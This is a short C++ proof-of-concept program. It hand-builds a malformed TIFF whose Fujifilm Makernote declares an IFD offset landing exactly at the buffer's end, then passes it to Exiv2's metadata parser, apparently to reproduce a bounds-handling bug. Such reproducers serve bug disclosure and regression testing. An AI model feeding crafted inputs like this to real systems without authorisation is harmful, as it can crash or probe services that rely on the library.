// PoC: drives Exiv2::Image::readMetadata() on a crafted TIFF whose Fujifilm
// Makernote declares an IFD offset that lands exactly at the end of the buffer.
#include <exiv2/exiv2.hpp>

#include <cstdint>
#include <iostream>

static const uint8_t tiff[] = {
    // TIFF header (little-endian)
    0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00,
    // IFD0: 2 entries
    0x02, 0x00,
    //   Make = "FUJIFILM\0"
    0x0f, 0x01, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x26, 0x00, 0x00, 0x00,
    //   ExifIFD pointer
    0x69, 0x87, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x00, 0x00,
    //   next-IFD pointer
    0x00, 0x00, 0x00, 0x00,
    // "FUJIFILM\0"
    0x46, 0x55, 0x4a, 0x49, 0x46, 0x49, 0x4c, 0x4d, 0x00,
    // Exif IFD: 1 entry
    0x01, 0x00,
    //   MakerNote: 30 bytes of undefined data at offset 65
    0x7c, 0x92, 0x07, 0x00, 0x1e, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00,
    //   next-IFD pointer
    0x00, 0x00, 0x00, 0x00,
    // Makernote payload (last 30 bytes of the file): Fujifilm header, whose
    // IFD offset field (bytes 8..11) equals the remaining buffer size (30).
    0x46, 0x55, 0x4a, 0x49, 0x46, 0x49, 0x4c, 0x4d,  // "FUJIFILM"
    0x1e, 0x00, 0x00, 0x00,                          // IFD offset = 30
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

int main() {
  Exiv2::LogMsg::setLevel(Exiv2::LogMsg::mute);
  try {
    Exiv2::DataBuf data(tiff, sizeof(tiff));
    auto image = Exiv2::ImageFactory::open(data.c_data(), data.size());
    if (!image) {
      std::cerr << "could not open image\n";
      return 2;
    }
    image->readMetadata();
  } catch (const std::exception& e) {
    std::cerr << "exception: " << e.what() << "\n";
  }
  return 0;
}
